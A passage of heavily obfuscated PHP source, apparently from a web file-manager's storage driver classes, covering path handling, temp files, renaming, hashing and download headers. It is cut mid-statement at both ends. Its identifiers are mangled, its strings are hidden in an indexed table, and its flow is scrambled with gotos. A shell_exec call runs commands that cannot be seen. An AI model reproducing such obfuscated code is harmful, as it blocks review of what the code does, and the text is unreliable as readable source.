$f‡•…›Â¤·[] = $E¯ÁÜŞª‡‹; } $this->queryID->reset(); return $f‡•…›Â¤·; } public function getFields($bæÚÜŞåˆÀ) { $eÍ‚Æé¨¥¬ =& $_SERVER[±á õÁ]; $a³Ÿ¿ÕÂ´ = $this->query($eÍ‚Æé¨¥¬[35] . $bæÚÜŞåˆÀ . $eÍ‚Æé¨¥¬[36]); $Eèƒª†‡‰» = array(); if ($a³Ÿ¿ÕÂ´) { foreach ($a³Ÿ¿ÕÂ´ as $d‡¨Ì¯µ§ => $a™…µ‰ÆÔ) { $Eèƒª†‡‰»[$a™…µ‰ÆÔ[$eÍ‚Æé¨¥¬[38]]] = array($eÍ‚Æé¨¥¬[38] => $a™…µ‰ÆÔ[$eÍ‚Æé¨¥¬[38]], $eÍ‚Æé¨¥¬[39] => $a™…µ‰ÆÔ[$eÍ‚Æé¨¥¬[39]], $eÍ‚Æé¨¥¬[41] => (bool) ($a™…µ‰ÆÔ[$eÍ‚Æé¨¥¬[41]] === $eÍ‚Æé¨¥¬[43]), $eÍ‚Æé¨¥¬[44] => $a™…µ‰ÆÔ[$eÍ‚Æé¨¥¬[63]], $eÍ‚Æé¨¥¬[46] => (bool) $a™…µ‰ÆÔ[$eÍ‚Æé¨¥¬[64]], $eÍ‚Æé¨¥¬[49] => (bool) $a™…µ‰ÆÔ[$eÍ‚Æé¨¥¬[64]]); } } return $Eèƒª†‡‰»; } public function getTables($fÙâÖ°¤ëä = '') { $Aù‰Â“Ë¥¨ =& $_SERVER[±á õÁ]; $c´Ù·„¼‡Ÿ = $this->query($Aù‰Â“Ë¥¨[52] . $Aù‰Â“Ë¥¨[53] . $Aù‰Â“Ë¥¨[54]); $b¾í©Ç…†Ì = array(); foreach ($c´Ù·„¼‡Ÿ as $b©”Êò“¶æ => $c¼î–ÜÍµ¦) { $b¾í©Ç…†Ì[$b©”Êò“¶æ] = current($c¼î–ÜÍµ¦); } return $b¾í©Ç…†Ì; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E¾ÜÒ°­à =& $_SERVER[±á õÁ]; $this->error = $this->_linkID->lastErrorMsg(); if ($E¾ÜÒ°­à[43] != $this->queryStr) { $this->error .= LNG($E¾ÜÒ°­à[55]) . $this->queryStr; } think_trace($this->error, $E¾ÜÒ°­à[43], $E¾ÜÒ°­à[56]); return $this->error; } public function escapeString($a”ô ÍÓÅ) { $eïâïÛÌ‚À =& $_SERVER[±á õÁ]; if ($this->_linkID) { return $this->_linkID->escapeString($a”ô ÍÓÅ); } return str_ireplace($eïâïÛÌ‚À[65], $eïâïÛÌ‚À[66], $a”ô ÍÓÅ); } public function parseLimit($eßÃØÇÚ) { $Fùå•¸ ß¸ =& $_SERVER[±á õÁ]; $fÕŒŠëñ = $Fùå•¸ ß¸[43]; if (!empty($eßÃØÇÚ)) { $eßÃØÇÚ = explode($Fùå•¸ ß¸[57], $eßÃØÇÚ); if (count($eßÃØÇÚ) > 1) { $fÕŒŠëñ .= $Fùå•¸ ß¸[58] . $eßÃØÇÚ[1] . $Fùå•¸ ß¸[59] . $eßÃØÇÚ[0] . $Fùå•¸ ß¸[60]; } else { $fÕŒŠëñ .= $Fùå•¸ ß¸[58] . $eßÃØÇÚ[0] . $Fùå•¸ ß¸[60]; } } return $fÕŒŠëñ; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $f‚š½ˆ¸¦Ş =& $_SERVER[±á õÁ]; $this->objectDriver = array($f‚š½ˆ¸¦Ş[67], $f‚š½ˆ¸¦Ş[68], $f‚š½ˆ¸¦Ş[69], $f‚š½ˆ¸¦Ş[70], $f‚š½ˆ¸¦Ş[71], $f‚š½ˆ¸¦Ş[72], $f‚š½ˆ¸¦Ş[73], $f‚š½ˆ¸¦Ş[74]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Câ†µáÒƒ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Câ†µáÒƒ, $_SERVER[±á õÁ][8]); } return $Câ†µáÒƒ; } public function getPathName($e×ØÃØŞë) { return $e×ØÃØŞë; } public function iconvApp($BÍ¯õœ½âö) { return $BÍ¯õœ½âö; } public function iconvSystem($bª»ôíìø) { return $bª»ôíìø; } public function iconvTo($fì °‰¾µ’, $E†ß¬·•µ¿, $d¶·Ò‘Ÿ) { goto C½÷…‡é–Ğ; DÓÀ¤½“”–: $e½Ñˆøàé¦ = $e½Ñˆøàé¦ ? $e½Ñˆøàé¦ : $fì °‰¾µ’; if (strstr($e½Ñˆøàé¦, $bêíÊµõÛ‹[79])) { $e½Ñˆøàé¦ = str_replace($bêíÊµõÛ‹[79], $bêíÊµõÛ‹[80], $e½Ñˆøàé¦); } $c¦è°ŠŞ„[$E†ß¬·•µ¿ . $bêíÊµõÛ‹[76] . $d¶·Ò‘Ÿ . $bêíÊµõÛ‹[77] . $fì °‰¾µ’] = $e½Ñˆøàé¦; goto e§ğŒæç; e§ğŒæç: $c¦è°ŠŞ„[$d¶·Ò‘Ÿ . $bêíÊµõÛ‹[76] . $E†ß¬·•µ¿ . $bêíÊµõÛ‹[77] . $fì °‰¾µ’] = $fì °‰¾µ’; $c¦è°ŠŞ„[$d¶·Ò‘Ÿ . $bêíÊµõÛ‹[76] . $E†ß¬·•µ¿ . $bêíÊµõÛ‹[77] . $e½Ñˆøàé¦] = $fì °‰¾µ’; $c¦è°ŠŞ„[$E†ß¬·•µ¿ . $bêíÊµõÛ‹[76] . $d¶·Ò‘Ÿ . $bêíÊµõÛ‹[77] . $e½Ñˆøàé¦] = $e½Ñˆøàé¦; goto FÃø…­ğ¤Ò; C½÷…‡é–Ğ: $bêíÊµõÛ‹ =& $_SERVER[±á õÁ]; if (!$fì °‰¾µ’ || !function_exists($bêíÊµõÛ‹[75])) { return $fì °‰¾µ’; } static $c¦è°ŠŞ„ = array(); goto fæ…Š”Œ‰¡; fæ…Š”Œ‰¡: $A¢·ÎĞÂâ— = $E†ß¬·•µ¿ . $bêíÊµõÛ‹[76] . $d¶·Ò‘Ÿ . $bêíÊµõÛ‹[77] . $fì °‰¾µ’; if (isset($c¦è°ŠŞ„[$A¢·ÎĞÂâ—])) { return $c¦è°ŠŞ„[$A¢·ÎĞÂâ—]; } if (function_exists($bêíÊµõÛ‹[78])) { $e½Ñˆøàé¦ = @mb_convert_encoding($fì °‰¾µ’, $d¶·Ò‘Ÿ, $E†ß¬·•µ¿); } else { $e½Ñˆøàé¦ = @iconv($E†ß¬·•µ¿, $d¶·Ò‘Ÿ, $fì °‰¾µ’); } goto DÓÀ¤½“”–; FÃø…­ğ¤Ò: return $e½Ñˆøàé¦; goto E…Â’ó¦ã·; E…Â’ó¦ã·: } public function getPathInner($A‹»Å‚Ö·) { $EæöÓÄÌŒ« = IO::init($A‹»Å‚Ö·); return $EæöÓÄÌŒ«->path; } public function getPathOuter($Däöì£Ñ³) { $CÖÌøŸƒ£Ï =& $_SERVER[±á õÁ]; $dÑß¯·ãô» = strlen(trim($this->pathBase, $CÖÌøŸƒ£Ï[8])); $Däöì£Ñ³ = substr(trim($Däöì£Ñ³, $CÖÌøŸƒ£Ï[8]), $dÑß¯·ãô»); return $this->pathDriver . $CÖÌøŸƒ£Ï[8] . ltrim($Däöì£Ñ³, $CÖÌøŸƒ£Ï[8]); } public function isParentOf($fÒõç¿æÎ, $fœ‚¬˜•ÊÇ) { $b—˜ßè±ª =& $_SERVER[±á õÁ]; $fÒõç¿æÎ = rtrim(strtolower($fÒõç¿æÎ), $b—˜ßè±ª[8]) . $b—˜ßè±ª[8]; $fœ‚¬˜•ÊÇ = rtrim(strtolower($fœ‚¬˜•ÊÇ), $b—˜ßè±ª[8]) . $b—˜ßè±ª[8]; $B äø§ÌÆ = strpos($fœ‚¬˜•ÊÇ, $fÒõç¿æÎ) === 0; return $B äø§ÌÆ; } public function getType() { $BÌŒ•‹ Š =& $_SERVER[±á õÁ]; $C¢øÖ­¸ = str_replace($BÌŒ•‹ Š[81], $BÌŒ•‹ Š[43], get_class($this)); return strtolower($C¢øÖ­¸); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($EØ÷ğŠù™™, $aŠ°È×Æœê) { $fÆ¬Øèäåš =& $_SERVER[±á õÁ]; $CªßâçŒ³ = rtrim($EØ÷ğŠù™™, $fÆ¬Øèäåš[8]) . $fÆ¬Øèäåš[8] . $aŠ°È×Æœê; $cæ§ª¾Ó¯ = $this->exist($CªßâçŒ³); return $cæ§ª¾Ó¯ ? $CªßâçŒ³ : !1; } public function setModifyTime($E·‘½ÂáÙ, $f‰Ë¶ÁÈ = '') { } public function renameObject($d¨µ²£ …¶, $B£§Æğë·Û) { goto FöÄ¢òÀ; aõ©Ôöå‹è: return $a„ÎóŞÌ–Ù ? $B£§Æğë·Û : !1; goto BÜØ®¤£Ó; C£ÏİÒ’Ê: $d¨µ²£ …¶ = $this->getPathOuter($d¨µ²£ …¶); $B£§Æğë·Û = $this->pathFather($d¨µ²£ …¶) . $B£§Æğë·Û; if (IO::isFile($d¨µ²£ …¶)) { $a„ÎóŞÌ–Ù = IO::copy($d¨µ²£ …¶, $this->pathFather($d¨µ²£ …¶), REPEAT_RENAME_FOLDER, $dÑ—·ä¥¦); if ($a„ÎóŞÌ–Ù) { IO::remove($d¨µ²£ …¶); } } else { $a„ÎóŞÌ–Ù = IO::mkdir($B£§Æğë·Û); if (!$a„ÎóŞÌ–Ù) { return !1; } $f‚ÔÚ‡œ¡Ë = IO::listPath($d¨µ²£ …¶, !0); $fßõ¦¦¨ÅÑ = array_merge($f‚ÔÚ‡œ¡Ë[$b¦¾õ¢Æ…[83]], $f‚ÔÚ‡œ¡Ë[$b¦¾õ¢Æ…[84]]); foreach ($fßõ¦¦¨ÅÑ as $A‘›á…ÁİÍ) { IO::move($A‘›á…ÁİÍ[$b¦¾õ¢Æ…[85]], $B£§Æğë·Û, REPEAT_RENAME_FOLDER); } IO::remove($d¨µ²£ …¶); } goto aõ©Ôöå‹è; FöÄ¢òÀ: $b¦¾õ¢Æ… =& $_SERVER[±á õÁ]; $dÑ—·ä¥¦ = $B£§Æğë·Û; Hook::trigger($b¦¾õ¢Æ…[82], $this, $d¨µ²£ …¶, $this, $this->pathFather($d¨µ²£ …¶) . $B£§Æğë·Û); goto C£ÏİÒ’Ê; BÜØ®¤£Ó: } public function tempFile($B•Ù¸äĞÊ¬ = '', $d§È†Èªƒ = '') { goto a™Íèì–î‰; F¡ä‹ÁßÍƒ: return $d³ê ˆÇ´÷; goto A›§¡ÀÔ¢õ; a™Íèì–î‰: if (!$B•Ù¸äĞÊ¬) { $B•Ù¸äĞÊ¬ = rand_string(15); } $b”æùà¨˜£ = TEMP_FILES . rand_string(15) . $_SERVER[±á õÁ][8]; @mkdir($b”æùà¨˜£, 511, !0); goto B†â¯ïƒ™‚; B†â¯ïƒ™‚: $d³ê ˆÇ´÷ = $b”æùà¨˜£ . $B•Ù¸äĞÊ¬; @touch($d³ê ˆÇ´÷); if ($d§È†Èªƒ) { file_put_contents($d³ê ˆÇ´÷, $d§È†Èªƒ); } goto F¡ä‹ÁßÍƒ; A›§¡ÀÔ¢õ: } public function tempFileRemve($C¹¹Ò÷ù½§) { @unlink($C¹¹Ò÷ù½§); @rmdir($this->pathFather($C¹¹Ò÷ù½§)); } public function mkfile($C÷²¾’§Äù, $A²‘ë…æÇ® = '', $bŒß×øÃ•Ù = REPEAT_RENAME) { } public function mkdir($bìñÜóµÉ‹, $E‡ğÓ£Ìì = REPEAT_SKIP) { } public function delFile($Dò¿é»ÔÜ) { } public function delFolder($f“•Ğ¾‚ÕÄ) { } public function copyFile($bò´°²¹ìï, $bè¨îôÑ¾») { } public function moveFile($a‚Û×ä‚é, $C­Ú¼ä§¤) { } public function remove($d÷¶ÏêÜ¦) { if ($this->isFile($d÷¶ÏêÜ¦)) { return $this->delFile($d÷¶ÏêÜ¦); } return $this->delFolder($d÷¶ÏêÜ¦); } public function rename($d—à´¦¡Ê, $D‹†¨¢àì) { } public function exist($F–áÓ‘š‡«) { } public function findByHash($d­Û©¥Çì¬ = '', $aôÉ«ÉÅ¼³ = '') { return !1; } public function isFile($d¦ù»ª®„Ã) { } public function isFolder($aÒÅìµëõ‚) { } public function size($cò‹Ó ÁÒ) { } public function info($BÕôè¼šÊ) { } public function infoSimple($dèîØõ½õé) { return $this->info($dèîØõ½õé); } public function infoAuth($Bƒ¢¡œÅŒ) { return $this->info($Bƒ¢¡œÅŒ); } public function infoFull($EÓÆÙÎİ³ï) { return $this->info($EÓÆÙÎİ³ï); } public function infoWithChildren($AƒñªÃÚ¬) { $C†‰¾‹ßãÊ =& $_SERVER[±á õÁ]; static $CæŸ–Ú’ë = array(); if (isset($CæŸ–Ú’ë[$AƒñªÃÚ¬])) { return $CæŸ–Ú’ë[$AƒñªÃÚ¬]; } $Cï»­ø¨ = $this->info($AƒñªÃÚ¬); if ($Cï»­ø¨ && $Cï»­ø¨[$C†‰¾‹ßãÊ[39]] == $C†‰¾‹ßãÊ[86]) { $fñÙ·í¤©Ÿ = array($C†‰¾‹ßãÊ[87] => 0, $C†‰¾‹ßãÊ[88] => 0, $C†‰¾‹ßãÊ[89] => 0); $this->infoChildren($AƒñªÃÚ¬, $fñÙ·í¤©Ÿ); $Cï»­ø¨[$C†‰¾‹ßãÊ[87]] = $fñÙ·í¤©Ÿ[$C†‰¾‹ßãÊ[87]]; $Cï»­ø¨[$C†‰¾‹ßãÊ[90]] = array($C†‰¾‹ßãÊ[91] => $fñÙ·í¤©Ÿ[$C†‰¾‹ßãÊ[88]], $C†‰¾‹ßãÊ[92] => $fñÙ·í¤©Ÿ[$C†‰¾‹ßãÊ[89]]); $CæŸ–Ú’ë[$AƒñªÃÚ¬] = $Cï»­ø¨; } return $Cï»­ø¨; } public function listPath($D•©»¥Ç™Ê, $e®†«ÃÅ¿Õ = false) { } public function has($B¶³åÎòÃì, $BÊŠæ¶²“² = false, $E¼”‰¼³ÄÆ = false) { } public function canRead($F±îôÖÎò) { } public function canWrite($C£ê¹‘Œ´) { } public function getContent($E¾ğâ‹ö) { } public function setContent($Aª´ƒ¥ïÃó, $AÛÂØå´Ö = '') { } protected function infoChildren($e“àÎóïºÇ, &$DŒ´¥ñÈšÅ) { $e©Ï®•‡ =& $_SERVER[±á õÁ]; check_abort(); $aíİå«‹“† = $this->listPath($e“àÎóïºÇ, !0); $aíİå«‹“† = array_merge($aíİå«‹“†[$e©Ï®•‡[84]], $aíİå«‹“†[$e©Ï®•‡[83]]); foreach ($aíİå«‹“† as $aÚ¢ âœÓ³) { if ($aÚ¢ âœÓ³[$e©Ï®•‡[39]] == $e©Ï®•‡[86]) { $DŒ´¥ñÈšÅ[$e©Ï®•‡[89]]++; $c÷Õ‰´Áœ“ = $this->getPathInner($aÚ¢ âœÓ³[$e©Ï®•‡[85]]); $this->infoChildren($c÷Õ‰´Áœ“, $DŒ´¥ñÈšÅ); } else { $DŒ´¥ñÈšÅ[$e©Ï®•‡[88]]++; $DŒ´¥ñÈšÅ[$e©Ï®•‡[87]] += $aÚ¢ âœÓ³[$e©Ï®•‡[87]]; } } } public function fileSubstr($bæ¸Áªß †, $Eåáá‡‘â, $a“­´¦ÜğÄ) { } public function listAll($B—‹ëŠ¢Á›) { } public function upload($dèÁÜ¶—ô…, $B÷ç¡…İ””, $aãù‹÷Œñ… = false, $eÍš„Ìˆ¨ = REPEAT_REPLACE) { } public function uploadFileByID($e¯Ê¦õôÁÇ, $föÒİğÙ‚Š, $bíŸ‚‚‡ï) { } public function uploadFileByPath($F¡Ä‚†±ó¿, $EÉÎ¸§Ú•°, $c˜¡ç†µ¡ = array()) { } public function isUploadServer() { $bàçãé«ğù =& $_SERVER[±á õÁ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $bàçãé«ğù[93]) { return !0; } return $GLOBALS[$bàçãé«ğù[6]][$bàçãé«ğù[94]][$bàçãé«ğù[95]]; } public function isFileOutServer() { $CÆø¬«é¢ =& $_SERVER[±á õÁ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $CÆø¬«é¢[93]) { return !0; } return $GLOBALS[$CÆø¬«é¢[6]][$CÆø¬«é¢[94]][$CÆø¬«é¢[96]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($fì‰ßÆÑ…Á) { $eÒ‚´ÃŒ¦ =& $_SERVER[±á õÁ]; if (!$this->isCdnHost()) { return $fì‰ßÆÑ…Á; } return str_replace(trim(get_url_root($fì‰ßÆÑ…Á), $eÒ‚´ÃŒ¦[8]), trim($this->cdnHost, $eÒ‚´ÃŒ¦[8]), $fì‰ßÆÑ…Á); } public function uploadLink($BÇ¾±¥‡¤Š, $CŞ¤‰ªè²¤ = 0) { goto E”óã¼×Ï; ašæš…ÇÒ«: if ($bÜë†¯¾×ğ) { $bÜë†¯¾×ğ[$d©¬¹ ­â[99]] = $BÇ¾±¥‡¤Š; $bÜë†¯¾×ğ[$d©¬¹ ­â[100]] = $eØ¸ÙÙÈÔÅ; } return $bÜë†¯¾×ğ; goto Aå®­Òˆ; D‚Ûèî¬¾: $fßµßÏö– = $CŞ¤‰ªè²¤ <= $Cæ¾¨¬áÎ¶ ? $d©¬¹ ­â[97] : $d©¬¹ ­â[98]; $D¿½·ßĞ»³ = (!$CŞ¤‰ªè²¤ ? 1 : ceil($CŞ¤‰ªè²¤ / pow(1024, 3))) * 3600 * 4; $bÜë†¯¾×ğ = $this->{$fßµßÏö–}($BÇ¾±¥‡¤Š, $D¿½·ßĞ»³); goto ašæš…ÇÒ«; eïÊŒ¸º: if (!in_array($eØ¸ÙÙÈÔÅ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Cæ¾¨¬áÎ¶ = 1024 * 1024 * 10; goto D‚Ûèî¬¾; E”óã¼×Ï: $d©¬¹ ­â =& $_SERVER[±á õÁ]; if ($this->isUploadServer()) { return; } $eØ¸ÙÙÈÔÅ = $this->getType(); goto eïÊŒ¸º; Aå®­Òˆ: } public function uploadFormData($bÕÉË±Ì¼‚, $a°¨Ç÷¤ó = 3600) { } public function multiUploadFormData($d‘ºÃëŒÊï, $B”ë‚½ˆÂ = 3600) { } public function download($AŠèÛ†õØ, $fãŒàò­„Ï) { } public function ext($Dôìè¾„‚™) { $DÔÛÂ•à¾á =& $_SERVER[±á õÁ]; if (strpos($Dôìè¾„‚™, $DÔÛÂ•à¾á[8]) === -1) { $b²èĞ‘ù£¹ = $Dôìè¾„‚™; } else { $b²èĞ‘ù£¹ = $this->pathThis($Dôìè¾„‚™); } $D¢„ë‡ë‰á = $DÔÛÂ•à¾á[43]; if (strstr($b²èĞ‘ù£¹, $DÔÛÂ•à¾á[101])) { $D¢„ë‡ë‰á = substr($b²èĞ‘ù£¹, strrpos($b²èĞ‘ù£¹, $DÔÛÂ•à¾á[101]) + 1); $D¢„ë‡ë‰á = strtolower($D¢„ë‡ë‰á); } if (strlen($D¢„ë‡ë‰á) > 3 && preg_match($DÔÛÂ•à¾á[102], $D¢„ë‡ë‰á, $DÀã±Àè™)) { $D¢„ë‡ë‰á = $DÔÛÂ•à¾á[43]; } return $D¢„ë‡ë‰á; } public function pathThis($cÎÔæŒº) { $E†À•õ‚ÇÑ =& $_SERVER[±á õÁ]; $cÎÔæŒº = str_replace($E†À•õ‚ÇÑ[103], $E†À•õ‚ÇÑ[8], rtrim($cÎÔæŒº, $E†À•õ‚ÇÑ[8])); $CµÖ›ÏšÔî = strrpos($cÎÔæŒº, $E†À•õ‚ÇÑ[8]); if ($CµÖ›ÏšÔî === !1) { return $cÎÔæŒº; } return substr($cÎÔæŒº, $CµÖ›ÏšÔî + 1); } public function pathFather($d¿ÑÄÀŞ¨¾) { $dùÃÇƒ§‘… =& $_SERVER[±á õÁ]; $d¿ÑÄÀŞ¨¾ = str_replace($dùÃÇƒ§‘…[103], $dùÃÇƒ§‘…[8], rtrim($d¿ÑÄÀŞ¨¾, $dùÃÇƒ§‘…[8])); $d«“ê§â³² = strrpos($d¿ÑÄÀŞ¨¾, $dùÃÇƒ§‘…[8]); if ($d«“ê§â³² === !1) { return $dùÃÇƒ§‘…[43]; } return substr($d¿ÑÄÀŞ¨¾, 0, $d«“ê§â³² + 1); } public function hashSimple($b³‰Šµ±¤É) { goto e‘öÂ²Í¾•; e‘öÂ²Í¾•: $c©ÛÍÓè¹ =& $_SERVER[±á õÁ]; if (!$b³‰Šµ±¤É) { return md5($c©ÛÍÓè¹[43]); } $dÀÙÊĞÊ¢ = $this->size($b³‰Šµ±¤É); goto Fœé¦ª¯ùÜ; Fœé¦ª¯ùÜ: $B«ÖËº¯ç = 200; $BÕ¼«èÚ£º = 50; if ($dÀÙÊĞÊ¢ <= $B«ÖËº¯ç * $BÕ¼«èÚ£º) { return $this->hashMd5($b³‰Šµ±¤É) . $dÀÙÊĞÊ¢; } goto BÌè©¦‚‘œ; AÃÆ÷†Æ›Å: $Fô°µœ¹© .= $this->fileSubstr($b³‰Šµ±¤É, $dÀÙÊĞÊ¢ - $B«ÖËº¯ç, $B«ÖËº¯ç); return md5($Fô°µœ¹©) . $dÀÙÊĞÊ¢; goto BÉÖ»ª†­ˆ; BÌè©¦‚‘œ: $f„ƒâÖÔÓ = intval($dÀÙÊĞÊ¢ / $BÕ¼«èÚ£º); $Fô°µœ¹© = $c©ÛÍÓè¹[43]; for ($a¶£‘Ñ–” = 0; $a¶£‘Ñ–” < $BÕ¼«èÚ£º; $a¶£‘Ñ–”++) { $Fô°µœ¹© .= $this->fileSubstr($b³‰Šµ±¤É, $f„ƒâÖÔÓ * $a¶£‘Ñ–”, $B«ÖËº¯ç); } goto AÃÆ÷†Æ›Å; BÉÖ»ª†­ˆ: } public static $md5Cache = array(); public function hashMd5($aÁô‚ÚŒ½‹) { $aÁô‚ÚŒ½‹ = $this->iconvSystem($aÁô‚ÚŒ½‹); if (isset(self::$md5Cache[$aÁô‚ÚŒ½‹])) { return self::$md5Cache[$aÁô‚ÚŒ½‹]; } self::$md5Cache[$aÁô‚ÚŒ½‹] = $this->hashMd5Shell($aÁô‚ÚŒ½‹); if (!self::$md5Cache[$aÁô‚ÚŒ½‹]) { self::$md5Cache[$aÁô‚ÚŒ½‹] = @md5_file($aÁô‚ÚŒ½‹); } return self::$md5Cache[$aÁô‚ÚŒ½‹]; } private function hashMd5Shell($DÃöóä© º) { goto a·š¥ß·Î; FÕÚ™Š¦Ä: $FÙÂªß»© = Cache::get($E…â˜£Õº[107]); if (!$FÙÂªß»©) { $dšÊ‘Ü¶ºí = BASIC_PATH . $E…â˜£Õº[108]; $C“ÚğÒë– = md5_file($dšÊ‘Ü¶ºí); $FÙÂªß»© = $E…â˜£Õº[109]; foreach ($D²ËĞ•ËÚ as $f‰î©–™Ÿ) { $A×õõÀ¹ = shell_exec($f‰î©–™Ÿ . "\x20\42{$dšÊ‘Ü¶ºí}\x22"); if ($A×õõÀ¹ && substr(trim($A×õõÀ¹), 0, 32) == $C“ÚğÒë–) { $FÙÂªß»© = $f‰î©–™Ÿ; break; } } Cache::set($E…â˜£Õº[107], $FÙÂªß»©, 3600); } if ($FÙÂªß»© == $E…â˜£Õº[109]) { return !1; } goto E‰­éÖ˜Ğø; E‰­éÖ˜Ğø: $A×õõÀ¹ = shell_exec($FÙÂªß»© . "\x20\42{$DÃöóä© º}\42"); $A×õõÀ¹ = str_replace($E…â˜£Õº[110], $E…â˜£Õº[43], $A×õõÀ¹); return substr($A×õõÀ¹, 0, 32); goto A¢Ö°œÕŸ; a·š¥ß·Î: $E…â˜£Õº =& $_SERVER[±á õÁ]; if (!function_exists($E…â˜£Õº[104])) { return !1; } $D²ËĞ•ËÚ = array($E…â˜£Õº[105], $E…â˜£Õº[106]); goto FÕÚ™Š¦Ä; A¢Ö°œÕŸ: } public function link($B£’ˆÉœï¢) { return $B£’ˆÉœï¢; } public function fileOut($F“ì¢ÙèÃô, $FÒêğÍí¡´ = false, $EÄ†“ª‚‚¥ = false, $F£º¼´… = '') { goto dÌ­óø©ßÒ; Dî¹Øìáê¼: $a¸ŸêÖŞî¬ = !0; if ($_SERVER[$Dí‚Ö¼¨ÚŠ[161]] == $Dí‚Ö¼¨ÚŠ[162] && $fŞ„™çÊ‹ > 1204 * 1024 * 1024 * 2) { $a¸ŸêÖŞî¬ = !1; } if ($a¸ŸêÖŞî¬) { header($Dí‚Ö¼¨ÚŠ[163] . ($aø¬¹Õ÷ˆ¶ - $a¦½ò–äÌÛ + 1)); } goto DøœãÌÉŠ; fìåñ‚¶¤: header($Dí‚Ö¼¨ÚŠ[145] . $fŞ„™çÊ‹); header($Dí‚Ö¼¨ÚŠ[146]); if (!$FÒêğÍí¡´ && $E£¤Á›™ŠÈ == $Dí‚Ö¼¨ÚŠ[147]) { if ($fŞ„™çÊ‹ > 1024 * 1024 * 5) { die; } $B‚Ö×¾È‘ = $this->getContent($F“ì¢ÙèÃô); $B‚Ö×¾È‘ = Html::clearSVG($B‚Ö×¾È‘); header($Dí‚Ö¼¨ÚŠ[148] . strlen($B‚Ö×¾È‘)); echo $B‚Ö×¾È‘; die; } goto díÜ‰è†á; Dª‹º‘Îî: $Fëˆ°·Ûù = get_file_mime($E£¤Á›™ŠÈ); if (strstr($Fëˆ°·Ûù, $Dí‚Ö¼¨ÚŠ[124])) { $Fëˆ°·Ûù = $Fëˆ°·Ûù . $Dí‚Ö¼¨ÚŠ[125]; } if ($FÒêğÍí¡´ === !1 && !mime_support($Fëˆ°·Ûù)) { $FÒêğÍí¡´ = !0; $Fëˆ°·Ûù = $Dí‚Ö¼¨ÚŠ[126]; } goto aÃøó†Õ; bæ¸„’ò‘: $a¦½ò–äÌÛ = 0; $aø¬¹Õ÷ˆ¶ = $fŞ„™çÊ‹ - 1; $E£¤Á›™ŠÈ = $this->ext($bµƒ‡…âš); goto e»šºÑ; A£¹ÁÅÀø: if (isset($_SERVER[$Dí‚Ö¼¨ÚŠ[138]]) && strtotime($_SERVER[$Dí‚Ö¼¨ÚŠ[138]]) == $bèÜÑô¼‚[$Dí‚Ö¼¨ÚŠ[117]]) { header($Dí‚Ö¼¨ÚŠ[139], !0, 304); die; } if (isset($_SERVER[$Dí‚Ö¼¨ÚŠ[140]]) && $_SERVER[$Dí‚Ö¼¨ÚŠ[140]] == $F£º¼´…) { header($Dí‚Ö¼¨ÚŠ[141] . $F£º¼´…, !0, 304); die; } header($Dí‚Ö¼¨ÚŠ[141] . $F£º¼´…); goto FÆÔ·à—÷; DøœãÌÉŠ: if ($_SERVER[$Dí‚Ö¼¨ÚŠ[164]] == $Dí‚Ö¼¨ÚŠ[165]) { return; } $CóÄ‘ì‰‡ = 1024 * 100; $eÂ’¦³ö© = 0; goto AæãâÜ¹„…; eõ¯êğ·±Ã: $AÁ¹¬µ“„ª = $this->getType() == $Dí‚Ö¼¨ÚŠ[112]; $d§¤Ô«Ğ = $GLOBALS[$Dí‚Ö¼¨ÚŠ[6]][$Dí‚Ö¼¨ÚŠ[94]][$Dí‚Ö¼¨ÚŠ[113]][$Dí‚Ö¼¨ÚŠ[114]]; $a•”İÍî†á = (double) $GLOBALS[$Dí‚Ö¼¨ÚŠ[6]][$Dí‚Ö¼¨ÚŠ[94]][$Dí‚Ö¼¨ÚŠ[113]][$Dí‚Ö¼¨ÚŠ[115]] * 1024 * 1024; goto cÛöÖ¿³›; FÆÔ·à—÷: header($Dí‚Ö¼¨ÚŠ[142] . $bø«Íéç¾æ . $Dí‚Ö¼¨ÚŠ[134]); header($Dí‚Ö¼¨ÚŠ[143] . $bµƒ‡…âš); header($Dí‚Ö¼¨ÚŠ[144]); goto fìåñ‚¶¤; aÃøó†Õ: $F½èÃ·‚ = rawurlencode($bµƒ‡…âš); $F½èÃ·‚ = $Dí‚Ö¼¨ÚŠ[123] . $F½èÃ·‚ . $Dí‚Ö¼¨ÚŠ[127] . $F½èÃ·‚; if ($FÒêğÍí¡´) { header($Dí‚Ö¼¨ÚŠ[128]); header($Dí‚Ö¼¨ÚŠ[129] . $F½èÃ·‚); } else { header($Dí‚Ö¼¨ÚŠ[130] . $F½èÃ·‚); } goto AˆŞ‡£Ü­Ø; dÌ­óø©ßÒ: $Dí‚Ö¼¨ÚŠ =& $_SERVER[±á õÁ]; $this->cacheMethod(null, null); if (!$F“ì¢ÙèÃô || !$this->exist($F“ì¢ÙèÃô)) { show_json(LNG($Dí‚Ö¼¨ÚŠ[111]), !1, $EÄ†“ª‚‚¥); } goto eõ¯êğ·±Ã; díÜ‰è†á: $fÌ§âíŠ¿¢ = strtolower($_SERVER[$Dí‚Ö¼¨ÚŠ[149]]); if ($AÁ¹¬µ“„ª && $fÌ§âíŠ¿¢ && $d§¤Ô«Ğ) { if (strstr($fÌ§âíŠ¿¢, $Dí‚Ö¼¨ÚŠ[150])) { header($Dí‚Ö¼¨ÚŠ[151] . $F“ì¢ÙèÃô); } else { if (strstr($fÌ§âíŠ¿¢, $Dí‚Ö¼¨ÚŠ[152])) { header($Dí‚Ö¼¨ÚŠ[153] . $F“ì¢ÙèÃô); } else { if (strstr($fÌ§âíŠ¿¢, $Dí‚Ö¼¨ÚŠ[154])) { header($Dí‚Ö¼¨ÚŠ[155] . $F“ì¢ÙèÃô); } } } if ($a•”İÍî†á) { header($Dí‚Ö¼¨ÚŠ[156] . $a•”İÍî†á); } return; } if (isset($_SERVER[$Dí‚Ö¼¨ÚŠ[157]])) { if (preg_match($Dí‚Ö¼¨ÚŠ[158], $_SERVER[$Dí‚Ö¼¨ÚŠ[157]], $f†¥ÕõÅë¥)) { $a¦½ò–äÌÛ = 